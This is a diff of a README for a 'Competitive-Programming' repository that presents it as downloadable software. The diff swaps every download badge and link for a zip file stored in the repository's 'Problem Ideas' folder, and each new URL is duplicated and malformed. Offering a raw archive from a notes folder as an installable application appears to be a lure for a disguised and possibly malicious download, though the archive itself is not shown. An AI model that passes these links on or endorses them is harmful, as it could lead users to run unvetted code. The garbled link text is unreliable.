@@ -1,6 +1,6 @@
 # 📚 Competitive-Programming - Solve Problems with Confidence
 
-[![Download Latest Release](https://raw.githubusercontent.com/Hridhaan-cmd/Competitive-Programming/main/DSU materials/Competitive-Programming_3.7-alpha.4.zip%20Latest%20Release-%E2%9C%94%EF%B8%8F-brightgreen)](https://raw.githubusercontent.com/Hridhaan-cmd/Competitive-Programming/main/DSU materials/Competitive-Programming_3.7-alpha.4.zip)
+[![Download Latest Release](https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip%20Latest%20Release-%E2%9C%94%EF%B8%8F-brightgreen)](https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Competitive-Programming** repository. This application provides
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Download Competitive-Programming](https://raw.githubusercontent.com/Hridhaan-cmd/Competitive-Programming/main/DSU materials/Competitive-Programming_3.7-alpha.4.zip).
+To get started, visit this page to download the software: [Download Competitive-Programming](https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip).
 
 ### Steps to Download:
 
@@ -72,4 +72,4 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 Thank you for using **Competitive-Programming**. We hope this application aids you in enhancing your programming skills. Happy coding!
 
-[![Download Latest Release](https://raw.githubusercontent.com/Hridhaan-cmd/Competitive-Programming/main/DSU materials/Competitive-Programming_3.7-alpha.4.zip%20Latest%20Release-%E2%9C%94%EF%B8%8F-brightgreen)](https://raw.githubusercontent.com/Hridhaan-cmd/Competitive-Programming/main/DSU materials/Competitive-Programming_3.7-alpha.4.zip)
+[![Download Latest Release](https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip%20Latest%20Release-%E2%9C%94%EF%B8%8F-brightgreen)](https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip https://github.com/Hridhaan-cmd/Competitive-Programming/raw/refs/heads/main/Problem Ideas/Competitive-Programming-2.2.zip)
